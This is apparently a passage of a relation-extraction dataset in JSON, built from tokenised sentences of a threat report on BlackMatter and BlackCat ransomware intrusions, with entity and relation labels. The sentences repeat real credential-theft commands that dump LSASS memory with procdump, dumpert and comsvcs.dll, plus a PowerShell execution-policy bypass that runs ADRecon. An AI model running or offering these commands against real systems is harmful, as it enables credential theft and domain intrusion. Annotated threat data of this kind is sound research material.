"below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "attackers", "pos": [10, 11], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [12, 12], "name": "logs", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "Gmer", "pos": [5, 6], "index": "2_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [67, 67], "name": "local and domain user credentials", "pos": [13, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "Dumpert", "pos": [24, 25], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [102, 102], "name": "BlackMatter attack", "pos": [2, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [106, 106], "name": "comsvcs.dll", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [113, 113], "name": "LSASS memory", "pos": [13, 15], "index": "8_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CD", "evidence": [0, 1, 2, 3], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "EX", "evidence": [7], "h": 6, "t": 7}, {"r": "WR", "evidence": [7], "h": 6, "t": 8}]}, {"title": "029-16", "sents": [["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "Gmer", "pos": [5, 6], "index": "0_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [40, 40], "name": "local and domain user credentials", "pos": [13, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "Dumpert", "pos": [24, 25], "index": "3_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [75, 75], "name": "BlackMatter attack", "pos": [2, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [79, 79], "name": "comsvcs.dll", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [86, 86], "name": "LSASS memory", "pos": [13, 15], "index": "6_0"}]], "labels": [{"r": "EX", "evidence": [6], "h": 4, "t": 5}, {"r": "WR", "evidence": [6], "h": 4, "t": 6}]}, {"title": "029-17", "sents": [["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."]], "vertexSet": [[{"type": "SF", "sent_id": 1, "global_pos": [20, 20], "name": "local and domain user credentials", "pos": [13, 18], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "Dumpert", "pos": [24, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [55, 55], "name": "BlackMatter attack", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [59, 59], "name": "comsvcs.dll", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [66, 66], "name": "LSASS memory", "pos": [13, 15], "index": "5_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [95, 95], "name": "Windows login credentials", "pos": [2, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [100, 100], "name": "attackers", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [107, 107], "name": "steal.exe", "pos": [14, 15], "index": "8_0"}]], "labels": [{"r": "EX", "evidence": [5], "h": 3, "t": 4}, {"r": "WR", "evidence": [5], "h": 3, "t": 5}, {"r": "CO", "evidence": [5, 6, 7], "h": 3, "t": 7}, {"r": "WR", "evidence": [7], "t": 6, "h": 7}, {"r": "EX", "evidence": [7], "h": 7, "t": 8}]}, {"title": "029-18", "sents": [["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [13, 13], "name": "local and domain user credentials", "pos": [13, 18], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "Dumpert", "pos": [24, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [48, 48], "name": "BlackMatter attack", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [52, 52], "name": "comsvcs.dll", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [59, 59], "name": "LSASS memory", "pos": [13, 15], "index": "5_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [88, 88], "name": "Windows login credentials", "pos": [2, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [93, 93], "name": "attackers", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [100, 100], "name": "steal.exe", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [112, 112], "name": "ADRecon", "pos": [4, 5], "index": "9_0"}]], "labels": [{"r": "EX", "evidence": [4], "h": 3, "t": 4}, {"r": "WR", "evidence": [4], "h": 3, "t": 5}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 3, "t": 9}, {"r": "CO", "evidence": [4, 5, 6], "h": 3, "t": 7}, {"r": "WR", "evidence": [6], "t": 6, "h": 7}, {"r": "EX", "evidence": [6], "h": 7, "t": 8}]}, {"title": "029-19", "sents": [["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [22, 22], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [26, 26], "name": "comsvcs.dll", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [33, 33], "name": "LSASS memory", "pos": [13, 15], "index": "2_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [62, 62], "name": "Windows login credentials", "pos": [2, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [67, 67], "name": "attackers", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [74, 74], "name": "steal.exe", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [86, 86], "name": "ADRecon", "pos": [4, 5], "index": "6_0"}]], "labels": [{"r": "EX", "evidence": [3], "h": 0, "t": 1}, {"r": "WR", "evidence": [3], "h": 0, "t": 2}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 0, "t": 6}, {"r": "CO", "evidence": [3, 4, 5], "h": 0, "t": 4}, {"r": "WR", "evidence": [5], "t": 3, "h": 4}, {"r": "EX", "evidence": [5], "h": 4, "t": 5}]}, {"title": "029-20", "sents": [["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [13, 13], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [17, 17], "name": "comsvcs.dll", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [24, 24], "name": "LSASS memory", "pos": [13, 15], "index": "2_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [53, 53], "name": "Windows login credentials", "pos": [2, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [58, 58], "name": "attackers", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [65, 65], "name": "steal.exe", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [77, 77], "name": "ADRecon", "pos": [4, 5], "index": "6_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [104, 104], "name": "TeamViewer installation", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [108, 108], "name": "BlackMatter attackers", "pos": [8, 10], "index": "8_0"}]], "labels": [{"r": "EX", "evidence": [2], "h": 0, "t": 1}, {"r": "WR", "evidence": [2], "h": 0, "t": 2}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 0, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 0, "t": 4}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 0, "t": 8}, {"r": "WR", "evidence": [4], "t": 3, "h": 4}, {"r": "EX", "evidence": [4], "h": 4, "t": 5}, {"r": "RD", "evidence": [7], "t": 7, "h": 8}]}, {"title": "029-21", "sents": [["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"], ["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [6, 6], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [10, 10], "name": "comsvcs.dll", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "LSASS memory", "pos": [13, 15], "index": "2_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [46, 46], "name": "Windows login credentials", "pos": [2, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "attackers", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "steal.exe", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [70, 70], "name": "ADRecon", "pos": [4, 5], "index": "6_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [97, 97], "name": "TeamViewer installation", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [101, 101], "name": "BlackMatter attackers", "pos": [8, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [114, 114], "name": "They", "pos": [0, 1], "index": "9_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [117, 117], "name": "keepass password manager configuration", "pos": [3, 7], "index": "10_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 0, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 0, "t": 8}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 9}, {"r": "WR", "evidence": [3], "t": 3, "h": 4}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [6], "t": 7, "h": 8}, {"r": "RD", "evidence": [7], "h": 9, "t": 10}]}, {"title": "029-22", "sents": [["During", "the", "BlackMatter", "attack", ",", "the", "comsvcs.dll", "was", "employed", "to", "directly", "dump", "the", "LSASS", "memory", "with", "the", "help", "of", "the", "following", "PowerShell", "command", ":"], ["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "comsvcs.dll", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "LSASS memory", "pos": [13, 15], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [42, 42], "name": "Windows login credentials", "pos": [2, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "attackers", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "steal.exe", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "ADRecon", "pos": [4, 5], "index": "6_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [93, 93], "name": "TeamViewer installation", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "BlackMatter attackers", "pos": [8, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [110, 110], "name": "They", "pos": [0, 1], "index": "9_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [113, 113], "name": "keepass password manager configuration", "pos": [3, 7], "index": "10_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 8}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 9}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [5], "t": 7, "h": 8}, {"r": "RD", "evidence": [6], "h": 9, "t": 10}]}, {"title": "029-23", "sents": [["powershell", "rundll32.exe", "c", ":", "\\windows\\system32\\comsvcs.dll", ",", "minidump", "(", "get-process", "lsass", ")", ".id", "c", ":", "\\temp\\lsass.dmp", "full"], ["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."]], "vertexSet": [[{"type": "TF", "sent_id": 1, "global_pos": [18, 18], "name": "Windows login credentials", "pos": [2, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "attackers", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "steal.exe", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "ADRecon", "pos": [4, 5], "index": "3_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [69, 69], "name": "TeamViewer installation", "pos": [4, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "BlackMatter attackers", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [86, 86], "name": "They", "pos": [0, 1], "index": "6_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [89, 89], "name": "keepass password manager configuration", "pos": [3, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [122, 122], "name": "the tool", "pos": [2, 4], "index": "8_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [129, 129], "name": "WinRM service", "pos": [9, 11], "index": "9_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [135, 135], "name": "firewall", "pos": [15, 16], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 0, "h": 1}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [4], "t": 4, "h": 5}, {"r": "RD", "evidence": [5], "h": 6, "t": 7}]}, {"title": "029-24", "sents": [["Apart", "from", "Windows", "login", "credentials", ",", "the", "attackers", "behind", "the", "BlackCat", "attack", "utilized", "``", "steal.exe", "''", "tool", "to", "collect", "additional", "data", "."], ["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "Windows login credentials", "pos": [2, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "attackers", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "steal.exe", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "ADRecon", "pos": [4, 5], "index": "3_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [53, 53], "name": "TeamViewer installation", "pos": [4, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "BlackMatter attackers", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "They", "pos": [0, 1], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [73, 73], "name": "keepass password manager configuration", "pos": [3, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [106, 106], "name": "the tool", "pos": [2, 4], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [113, 113], "name": "WinRM service", "pos": [9, 11], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [119, 119], "name": "firewall", "pos": [15, 16], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "Attackers", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [136, 136], "name": "WinRM", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [139, 139], "name": "PowerShell", "pos": [6, 7], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [3], "t": 4, "h": 5}, {"r": "RD", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [6, 7], "h": 8, "t": 12}, {"r": "WR", "evidence": [1, 2, 3, 4, 5, 6, 7], "t": 3, "h": 11}, {"r": "RD", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "ST", "evidence": [6, 7], "t": 9, "h": 11}, {"r": "WR", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}, {"r": "FR", "evidence": [7], "h": 11, "t": 13}]}, {"title": "029-25", "sents": [["Additionally", ",", "they", "employed", "ADRecon", "to", "gather", "information", "from", "Active", "Directory", "and", "its", "key", "servers", "via", "the", "following", "PowerShell", "command", ":"], ["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "ADRecon", "pos": [4, 5], "index": 